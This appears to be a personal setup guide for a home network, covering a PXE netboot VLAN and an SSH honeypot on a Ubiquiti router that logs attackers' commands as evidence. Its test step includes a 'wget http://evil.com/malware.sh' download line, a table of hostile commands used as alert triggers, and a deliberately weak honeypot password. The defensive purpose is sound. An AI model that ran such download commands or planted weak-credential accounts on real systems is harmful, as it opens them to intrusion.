# PXE Boot Network + SSH Honeypot Setup

## Part 1: PXE/Netboot VLAN (VLAN 50)

### Purpose
- Automated hardware provisioning
- Network boot for diskless systems
- Quiet, isolated environment for mass deployments
- 10.0.50.0/24 subnet

### Network Configuration

**Created via API:**
- VLAN ID: 50
- Subnet: 10.0.50.0/24
- Gateway: 10.0.50.1
- DHCP Range: 10.0.50.100-200
- TFTP Server: 10.0.50.10 (for PXE boot files)

### PXE Server Setup (Quick)

**Option A: Ubuntu PXE Server**

```bash
# On a dedicated server at 10.0.50.10
sudo apt update
sudo apt install -y dnsmasq pxelinux syslinux-common

# Configure dnsmasq for PXE
sudo tee /etc/dnsmasq.d/pxe.conf << 'EOF'
interface=eth0
bind-interfaces
dhcp-range=10.0.50.100,10.0.50.200,12h
dhcp-boot=pxelinux.0
enable-tftp
tftp-root=/var/lib/tftpboot
EOF

# Set up TFTP boot files
sudo mkdir -p /var/lib/tftpboot/pxelinux.cfg
sudo cp /usr/lib/PXELINUX/pxelinux.0 /var/lib/tftpboot/
sudo cp /usr/lib/syslinux/modules/bios/*.c32 /var/lib/tftpboot/

# Default PXE menu
sudo tee /var/lib/tftpboot/pxelinux.cfg/default << 'EOF'
DEFAULT menu.c32
PROMPT 0
TIMEOUT 300

MENU TITLE Network Boot Menu

LABEL ubuntu-live
  MENU LABEL Ubuntu 22.04 Live
  KERNEL ubuntu/vmlinuz
  APPEND initrd=ubuntu/initrd boot=casper netboot=nfs nfsroot=10.0.50.10:/ubuntu-live

LABEL memtest
  MENU LABEL Memory Test
  KERNEL memtest86+.bin

LABEL local
  MENU LABEL Boot from Local Disk
  LOCALBOOT 0
EOF

sudo systemctl restart dnsmasq
sudo systemctl enable dnsmasq
```

**Option B: Simple HTTP Boot (UEFI)**

```bash
# Modern UEFI systems can boot directly from HTTP
sudo apt install nginx

# Serve boot files via HTTP
sudo mkdir -p /var/www/netboot
sudo tee /etc/nginx/sites-available/pxe << 'EOF'
server {
    listen 10.0.50.10:80;
    root /var/www/netboot;
    autoindex on;

    location / {
        try_files $uri $uri/ =404;
    }
}
EOF

sudo ln -s /etc/nginx/sites-available/pxe /etc/nginx/sites-enabled/
sudo systemctl restart nginx
```

### PXE Client Configuration

**BIOS/Legacy Boot:**
- Boot device order: Network/PXE first
- Save and reboot
- System will pull from 10.0.50.10 TFTP

**UEFI Boot:**
- Boot manager → Add boot option
- Protocol: PXE or HTTP
- Server: http://10.0.50.10/boot.efi

### Firewall Rules for PXE VLAN

```bash
# Allow PXE to access internet for downloads
# Block PXE from accessing other internal VLANs

# Via UI: Settings → Firewall Rules
Rule: Allow PXE → Internet
  Source: Network → PXE-Netboot
  Destination: Any (Internet)
  Protocol: All
  Action: Accept

Rule: Block PXE → Internal
  Source: Network → PXE-Netboot
  Destination: Network → Trusted/Management/IoT
  Protocol: All
  Action: Drop
```

---

## Part 2: SSH Honeypot Shell

### Purpose
Catch attackers who SSH into your systems and log everything they do for evidence.

### How It Works
1. Attacker SSHs in (via compromised SSO or stolen keys)
2. Instead of real shell, they get honeypot
3. Every command logged with timestamps
4. They think they're on real system
5. You collect evidence for CVE/law enforcement

### Setup on UDM (or any SSH-accessible device)

**Step 1: Install Honeypot Shell**

```bash
# SSH to your UDM (from Mac)
ssh admin@192.168.1.1

# Copy honeypot shell
cat > /root/ssh-honeypot-shell.sh << 'EOF'
[paste entire ssh-honeypot-shell.sh content here]
EOF

chmod +x /root/ssh-honeypot-shell.sh

# Create log directory
mkdir -p /var/log/ssh-honeypot
chmod 700 /var/log/ssh-honeypot
```

**Step 2: Create Honeypot User**

```bash
# Create a fake admin user that attackers might target
adduser --disabled-password --shell /root/ssh-honeypot-shell.sh honeypot-admin
echo "honeypot-admin:WeakPassword123" | chpasswd  # Intentionally weak

# Or replace an existing compromised user's shell
usermod -s /root/ssh-honeypot-shell.sh <username>
```

**Step 3: Test It**

```bash
# From your Mac
ssh honeypot-admin@192.168.1.1
# Password: WeakPassword123

# Try some commands:
whoami
id
ls -la
cat /etc/passwd
wget http://evil.com/malware.sh

# Check logs:
ssh admin@192.168.1.1
tail -f /var/log/ssh-honeypot/session-*.log
```

### Advanced: Replace Shell for Suspected Compromised Account

If you suspect an attacker has access to a user account:

```bash
# Temporarily replace their shell with honeypot
# (Do this AFTER they've logged in once, so they don't notice immediately)

# Check current logins
who

# Replace shell for suspicious user
usermod -s /root/ssh-honeypot-shell.sh suspicioususer

# Monitor
tail -f /var/log/ssh-honeypot/session-*.log
```

### What Gets Logged

Every honeypot session creates:
- `session-YYYYMMDD-HHMMSS-PID.log` - Full command log with timestamps
- `evidence-YYYYMMDD-HHMMSS-PID.txt` - Clean evidence file for disclosure
- `ALERTS.txt` - Summary of critical actions

### Honeypot Responses

The honeypot responds realistically to common attacker commands:

| Attacker Command | Honeypot Response | Alert |
|------------------|-------------------|-------|
| `whoami` | `root` | User check |
| `id` | `uid=0(root)...` | Permission check |
| `ls` | Fake directory listing | Recon |
| `wget/curl` | Command not found | **CRITICAL: Download attempt** |
| `rm -rf` | Permission denied | **CRITICAL: Destruction attempt** |
| `iptables` | Command not found | **CRITICAL: Firewall tampering** |
| `crontab -e` | Command not found | **CRITICAL: Persistence attempt** |
| `cat /etc/shadow` | Permission denied | Password theft |
| `ps aux` | Fake process list | Process recon |

### Monitoring Honeypot Activity

**Real-time monitoring:**
```bash
# Watch all sessions
tail -f /var/log/ssh-honeypot/*.log

# Watch alerts only
watch -n 1 tail -20 /var/log/ssh-honeypot/ALERTS.txt

# Count sessions
ls /var/log/ssh-honeypot/session-* | wc -l
```

**Analyze attacker behavior:**
```bash
# Most common commands
cat /var/log/ssh-honeypot/*.log | grep "COMMAND:" | sort | uniq -c | sort -rn

# Critical actions
grep "CRITICAL" /var/log/ssh-honeypot/*.log

# Session durations
grep "Duration:" /var/log/ssh-honeypot/*.log
```

### Evidence Collection

When you catch an attacker:

```bash
# Package all evidence
cd /var/log/ssh-honeypot
tar -czf ssh-honeypot-evidence-$(date +%Y%m%d).tar.gz *.log *.txt
sha256sum ssh-honeypot-evidence-*.tar.gz > SHA256SUMS

# Copy to safe location
scp ssh-honeypot-evidence-*.tar.gz admin@10.0.1.50:/backups/evidence/
```

### Integration with Main Monitoring

Add to your attack monitoring script:

```bash
# In ~/workwork/monitor-attack-simple.sh

# Check for SSH honeypot activity
if [ -f /var/log/ssh-honeypot/ALERTS.txt ]; then
    NEW_ALERTS=$(tail -1 /var/log/ssh-honeypot/ALERTS.txt)
    if [ -n "$NEW_ALERTS" ]; then
        echo "$TS | SSH HONEYPOT ALERT: $NEW_ALERTS"
        osascript -e "display notification \"$NEW_ALERTS\" with title \"SSH Honeypot Alert\""
    fi
fi
```

---

## Part 3: Combined Attack Capture

### Full Setup for 0-Day Evidence

You now have three layers of attack detection:

1. **SSO/API Monitoring** - Captures Ubiquiti Identity compromise
2. **Packet Capture** - Records all network traffic
3. **SSH Honeypot** - Logs attacker commands if they SSH in

### Attacker's Likely Path:

```
1. Compromise Ubiquiti SSO
   → Captured by: API monitoring + packet capture

2. Login to UDM via SSO
   → Captured by: Auth logs + packet capture

3. Create backdoor user
   → Captured by: API monitoring

4. SSH into UDM as backdoor user
   → Captured by: SSH honeypot shell

5. Try to install malware/persistence
   → Captured by: Honeypot command logs

6. Attempt lateral movement
   → Captured by: Firewall logs + IPS
```

### Evidence Package for Ubiquiti

After you capture the attack:

```
ubiquiti-0day-evidence/
├── sso-compromise/
│   ├── api-logs.txt              # SSO authentication
│   ├── session-creation.json     # Session tokens
│   └── user-creation.json        # Backdoor account
├── network-capture/
│   ├── udm-traffic.pcap          # Full packet capture
│   └── attack-timeline.txt       # Timestamp analysis
├── ssh-honeypot/
│   ├── session-*.log             # Every command they typed
│   ├── evidence-*.txt            # Clean evidence file
│   └── ALERTS.txt                # Critical actions summary
├── firewall-logs/
│   ├── blocked-attempts.txt
│   └── lateral-movement.txt
└── README.md                     # Attack summary
```

---

## Network Topology After Setup

```
Internet
   |
[UDM Pro Max]
   |
   +-- VLAN 1  (Management)    10.0.1.0/24   - Infrastructure
   +-- VLAN 10 (Trusted)       10.0.10.0/24  - Your devices
   +-- VLAN 20 (IoT)           10.0.20.0/24  - Smart devices
   +-- VLAN 30 (Guest)         10.0.30.0/24  - Guest WiFi
   +-- VLAN 40 (Lab)           10.0.40.0/24  - Testing
   +-- VLAN 50 (PXE-Netboot)   10.0.50.0/24  - Mass provisioning **NEW**
   +-- VLAN 98 (Testing)       10.0.98.0/24  - Device adoption
   +-- VLAN 99 (Quarantine)    10.0.99.0/24  - Isolated/compromised
```

---

## Quick Start

### PXE Network:
```bash
1. Verify VLAN 50 created
2. Set up PXE server at 10.0.50.10
3. Configure DHCP/TFTP
4. Test boot a machine
```

### SSH Honeypot:
```bash
1. Copy ssh-honeypot-shell.sh to target system
2. Create honeypot user with weak password
3. Wait for attacker to SSH in
4. Watch logs: tail -f /var/log/ssh-honeypot/*.log
```

---

## Legal Note

**SSH Honeypot Legality:**
- ✅ Legal: On YOUR systems
- ✅ Legal: Logging access to YOUR accounts
- ✅ Legal: Defensive security measure
- ✅ Legal: Evidence collection for law enforcement

**NOT Legal:**
- ❌ Hacking back into attacker's systems
- ❌ Deploying honeypot on someone else's system
- ❌ Using evidence to extort

---

## Maintenance

### Daily:
- Check honeypot logs for activity
- Review ALERTS.txt for critical actions

### Weekly:
- Archive old honeypot logs
- Update honeypot responses if needed

### When Attack Detected:
1. Let it run (collect evidence)
2. Don't interrupt attacker
3. Log everything
4. Package evidence when done
5. Report to Ubiquiti + law enforcement

---

## Summary

You now have:
✅ **PXE boot network** for easy hardware provisioning
✅ **SSH honeypot** to catch and log attackers
✅ **Complete monitoring** of SSO, network, and SSH layers
✅ **Evidence collection** for CVE disclosure

**Next attacker who SSHs in gets logged completely. Every. Single. Command.**

Free router + potential bug bounty + criminal charges for attacker. 😎
